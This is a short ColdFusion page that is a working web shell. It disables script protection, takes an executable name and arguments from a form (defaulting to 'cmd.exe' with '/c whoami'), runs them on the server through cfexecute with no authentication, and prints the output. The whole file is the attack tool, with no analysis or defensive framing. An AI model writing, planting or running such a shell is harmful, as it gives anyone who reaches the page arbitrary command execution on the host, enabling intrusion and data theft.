<cfapplication scriptProtect="none">
<html>
<body>

<cfoutput>
	<form action="<cfoutput>#cgi.script_name#</cfoutput>" method="POST">
        <cfif IsDefined("form.cmd")>
        Executable: <Input type="text" name="cmd" value="<cfoutput>#HTMLEditFormat(form.cmd)#</cfoutput>"><br>
		Arguments:  <Input type="text" name="op" value=""><br>
        <cfelse>
        Executable: <Input type="text" name="cmd" value="cmd.exe"><br>
        Arguments:  <Input type="text" name="op" value="/c whoami"><br>
        </cfif>

        <input type="submit">
    </form>
<cfif IsDefined("form.cmd")>
	<cfsavecontent variable="myVar">
	<cfexecute name = "#Form.cmd#" arguments = "#op#" timeout = "5">
	</cfexecute>
	</cfsavecontent>
	<pre>
	#myVar#
	</pre>
</cfif>
</cfoutput>
</body>
</html>
